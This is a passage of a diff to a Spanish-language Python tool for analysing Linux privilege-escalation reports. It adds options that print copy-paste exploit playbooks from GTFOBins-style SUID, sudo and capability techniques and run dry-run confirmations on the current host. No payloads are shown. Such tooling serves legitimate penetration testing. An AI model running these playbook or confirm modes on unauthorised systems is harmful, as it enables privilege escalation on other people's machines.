             md.append(f"- **Descripción:** {e.description}")
             if e.requires:
                 md.append(f"- **Requiere:** {e.requires}")
+            if e.confidence_note:
+                md.append(f"- **Nota sobre confianza:** {e.confidence_note}")
             md.append(f"- **PoC:** [{e.poc_url}]({e.poc_url})\n")
 
     if paths:
@@ -636,9 +1943,11 @@ Ejemplos:
   %(prog)s reporte.json
   %(prog)s reporte.json --score
   %(prog)s reporte.json --exploits --paths
+  %(prog)s reporte.json --commands           # comandos exactos sugeridos
   %(prog)s --diff antes.json despues.json
   %(prog)s --batch host1.json host2.json host3.json
   %(prog)s reporte.json -o analisis.md
+  %(prog)s --list-techniques                 # ver coverage de gtfobins.py
         """,
     )
     parser.add_argument('reports', nargs='*', type=Path,
@@ -646,6 +1955,15 @@ Ejemplos:
     parser.add_argument('--score', action='store_true', help='Solo mostrar score')
     parser.add_argument('--exploits', action='store_true', help='Solo exploits sugeridos')
     parser.add_argument('--paths', action='store_true', help='Solo attack paths')
+    parser.add_argument('--commands', action='store_true',
+                        help='Solo comandos accionables (requiere reporte v2)')
+    parser.add_argument('--playbook', action='store_true',
+                        help='Modo copy-paste: solo comandos en orden de prioridad, '
+                             'sin colores ni metadata. Ideal para guardar como .txt.')
+    parser.add_argument('--confirm', action='store_true',
+                        help='Ejecutar dry_run de cada técnica accionable EN ESTE HOST '
+                             'para confirmar que el exploit funciona. Solo usar si estás '
+                             'autorizado en este sistema. Comandos no-destructivos por diseño.')
     parser.add_argument('--diff', nargs=2, type=Path, metavar=('OLD', 'NEW'),
                         help='Comparar dos reportes')
     parser.add_argument('--batch', action='store_true',
@@ -653,11 +1971,39 @@ Ejemplos:
     parser.add_argument('-o', '--output', type=Path,
                         help='Exportar análisis a Markdown')
     parser.add_argument('--no-color', action='store_true', help='Desactivar colores ANSI')
+    parser.add_argument('--list-techniques', action='store_true',
+                        help='Listar coverage de gtfobins.py y salir')
 
     args = parser.parse_args()
 
     if args.no_color or not sys.stdout.isatty():
         C.disable()
+
+    # Modo --list-techniques: mostrar coverage de la base local y salir
+    if args.list_techniques:
+        if gtfobins is None:
+            print(f"{C.RED}gtfobins.py no se pudo cargar{C.RESET}")
+            sys.exit(1)
+        cov = gtfobins.coverage_summary()
+        print(f"\n{C.BOLD}Cobertura de gtfobins.py{C.RESET}\n")
+        print(f"  Binarios SUID documentados   : {cov['suid_count']}")
+        print(f"  Binarios sudo documentados   : {cov['sudo_count']}")
+        print(f"  Capabilities con explotación : {cov['capabilities_count']}")
+        print(f"  Técnicas por capability      : {cov['capability_techniques_count']}")
+        print(f"\n  {C.DIM}SUID:    {', '.join(gtfobins.all_suid_binaries())}{C.RESET}")
+        print(f"\n  {C.DIM}Sudo:    {', '.join(gtfobins.all_sudo_binaries())}{C.RESET}")
+        print(f"\n  {C.DIM}Caps:    {', '.join(gtfobins.all_capabilities())}{C.RESET}\n")
+
+        if suid_whitelist is not None:
+            wl = suid_whitelist.whitelist_summary()
+            print(f"{C.BOLD}Whitelist de SUID legítimos (suid_whitelist.py){C.RESET}\n")
+            print(f"  Comunes a todas las distros : {wl['common_count']}")
+            print(f"  Específicos Debian/Ubuntu   : {wl['debian_count']}")
+            print(f"  Específicos RHEL/Fedora     : {wl['rhel_count']}")
+            print(f"  Específicos Arch            : {wl['arch_count']}")
+            print(f"  Específicos Alpine          : {wl['alpine_count']}")
+            print(f"  Total paths únicos          : {wl['total_unique_paths']}\n")
+        return
 
     # Modo diff
     if args.diff:
@@ -679,6 +2025,18 @@ Ejemplos:
     # Análisis simple
     r = Report.from_file(args.reports[0])
 
+    # Modo --playbook: solo comandos copy-paste, sin colores ni decoración
+    if args.playbook:
+        C.disable()  # forzar sin colores
+        render_playbook(r)
+        return
+
+    # Modo --confirm: ejecutar dry_run en el host actual
+    if args.confirm:
+        render_header(r)
+        render_confirm(r)
+        return
+
     if args.output:
         export_markdown(r, args.output)
         return
@@ -686,12 +2044,14 @@ Ejemplos:
     render_header(r)
 
     # Si se especifican secciones, solo mostrar esas. Si no, todas.
-    show_all = not (args.score or args.exploits or args.paths)
+    show_all = not (args.score or args.exploits or args.paths or args.commands)
 
     if show_all or args.score:
         render_score(r)
     if show_all or args.exploits:
         render_exploits(r)
+    if show_all or args.commands:
+        render_actionable_commands(r)
     if show_all or args.paths:
         render_attack_paths(r)
     if show_all:
